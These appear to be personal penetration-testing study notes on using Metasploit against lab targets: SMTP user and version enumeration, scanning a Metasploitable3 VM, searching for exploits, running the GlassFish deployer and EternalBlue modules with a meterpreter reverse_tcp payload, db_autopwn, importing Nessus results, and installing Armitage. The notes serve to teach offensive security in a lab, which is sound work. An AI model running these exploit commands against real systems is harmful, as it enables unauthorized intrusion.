> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)

```bash
ip -br -c a
setg RHOSTS 192.8.115.3
setg RHOST 192.8.115.3
workspace -a SMTP_ENUM
# Run a portscan to identify SMTP port, in this case is port 25
```

> **`auxiliary/scanner/smtp/smtp_enum`**

```bash
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_enum
options
run
```

```bash
[+] 192.63.243.3:25 - 192.63.243.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
```

> **`auxiliary/scanner/smtp/smtp_version`**

```bash
search type:auxiliary name:smtp
use auxiliary/scanner/smtp/smtp_version
options
run
```

```bash
[+] 192.8.115.3:25 - 192.8.115.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
```

## Vulnerability Scanning With MSF

MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.

- Useful in the **Exploitation** phase of the pentest

[Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.

- **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.

> 🔬 You can find my the lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), *set up for educational purposes*.

- Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.

Detect active hosts on the local network, from the Kali VM:

```bash
sudo nmap -sn 192.168.31.0/24
```

```bash
Nmap scan report for 192.168.31.139 # Linux target
Nmap scan report for 192.168.31.140 # Windows2008 target
```

- Run Metasploit:

```bash
service postgresql start && msfconsole -q
```

```bash
db_status
setg RHOSTS 192.168.31.140
setg RHOST 192.168.31.140
workspace -a VULN_SCAN_MS3
```

- **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF

```bash
db_nmap -sS -sV -O 192.168.31.140
```

```bash
[*] Nmap: 21/tcp    open  ftp Microsoft ftpd
[*] Nmap: 22/tcp    open  ssh OpenSSH 7.1 (protocol 2.0)
[*] Nmap: 80/tcp    open  http Microsoft IIS httpd 7.5
[*] Nmap: 135/tcp   open  msrpc Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3306/tcp  open  mysql MySQL 5.5.20-log
[*] Nmap: 3389/tcp  open  tcpwrapped
[*] Nmap: 4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 7676/tcp  open  java-message-service Java Message Service 301
[*] Nmap: 8009/tcp  open  ajp13 Apache Jserv (Protocol v1.3)
[*] Nmap: 8080/tcp  open  http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8181/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
[*] Nmap: 8383/tcp  open  http Apache httpd
[*] Nmap: 9200/tcp  open  wap-wsp?
[*] Nmap: 49152/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc Microsoft Windows RPC
[...]
```

![db_nmap](.gitbook/assets/image-20230413200524969.png)

```bash
hosts
services
```

- Manually search for a specific exploit
  - Check if there are any exploits for a particular **version** of a service

```bash
search type:exploit name:iis
```

![search type:exploit name:iis](.gitbook/assets/image-20230413192845621.png)

```bash
search Sun GlassFish
```

- Check if a module will work on the specific version of the service

```bash
use exploit/multi/http/glassfish_deployer
info

# Description:
#   This module logs in to a GlassFish Server (Open Source or
#   Commercial) using various methods (such as authentication bypass,
#   default credentials, or user-supplied login), and deploys a
#   malicious war file in order to get remote code execution. It has
#   been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System
#   Application Server 9.x. Newer GlassFish versions do not allow remote
#   access (Secure Admin) by default, but is required for exploitation.
```

```bash
set payload windows/meterpreter/reverse_tcp
options
# check the LHOST, LPORT, APP_RPORT, RPORT, PAYLOAD options
```

- Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules

```bash
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
```

![](.gitbook/assets/image-20230413194606641.png)

- Back in `msfconsole`, check if the server is vulnerable to MS17-010

```bash
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
run
```

![](.gitbook/assets/image-20230413200558380.png)

```bash
use exploit/windows/smb/ms17_010_eternalblue
options
# always check Payload options
run
```

> [**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
>
> - *takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services* 

- On a Kali terminal

```bash
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```

- On `msfconsole`

```bash
load db_autopwn
```

```bash
db_autopwn -p -t
# Enumerates exploits for each of the open ports
```

```bash
db_autopwn -p -t -PI 445
# Limit to only the 445 port
```

![db_autopwn -p -t -PI 445](.gitbook/assets/image-20230413202435550.png)

- On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services) 

```
analyze
```

![analyze](.gitbook/assets/image-20230413202708057.png)

```bash
vulns
```

![vulns](.gitbook/assets/image-20230413202802181.png)

### VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/)

> 🔬 You can find my [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems-notes/linux/tools/nessus).

- A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
- Nessus Essentials free version allows to scan up to 16 IPs.

Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.

Wait for the scan conclusion and export the results with the **Export/Nessus** button.

 ![Nessus Essentials - Metasploitable3](.gitbook/assets/image-20230413222104319.png)

- Open the `msfconsole` terminal and import the Nessus results
  - Check the information from the scan results with the `hosts`, `services`, `vulns` commands

```bash
workspace -a MS3_NESSUS
db_import /home/kali/Downloads/MS3_zph3t5.nessus
hosts
services
vulns
```

![](.gitbook/assets/image-20230413222333897.png)

```bash
vulns -p 445
```

![](.gitbook/assets/image-20230413222411974.png)

```bash
search cve:2017 name:smb
search MS12-020
search cve:2019 name:rdp
search cve:2015 name:ManageEngine
search PHP CGI Argument Injection
```

### VA with [WMAP](https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/)



## Client-Side Attacks with MSF





## Exploitation with MSF





## Post Exploitation with MSF





## Armitage - MSF GUI

### Kali Linux Installation

```bash
sudo apt install armitage -y
```

```bash
sudo msfdb init
```

```bash
sudo nano /etc/postgresql/15/main/pg_hba.conf
# On line 87 switch “scram-sha-256” to “trust”
```

```bash
sudo systemctl enable postgresql
sudo systemctl restart postgresql
```

```bash
sudo armitage
```

